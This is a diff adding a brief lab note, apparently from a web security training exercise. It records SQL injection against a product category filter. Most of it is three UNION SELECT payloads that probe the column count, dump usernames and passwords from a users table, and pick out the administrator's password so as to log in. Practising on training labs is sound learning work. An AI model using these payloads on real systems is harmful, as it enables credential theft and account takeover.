@@ -1,0 +1,11 @@
+SQL Injection - product category filter
+
+The database contains a different table (users) with two columns (username, password)
+
+Goal: retrive all usernames and passwords, use this information to login as administrator.
+
+
+process:
+Pets' UNION SELECT NULL, NULL--
+Pets' UNION SELECT username, password FROM users--
+Lifestyle' UNION SELECT username, password FROM users WHERE username = 'administrator'--
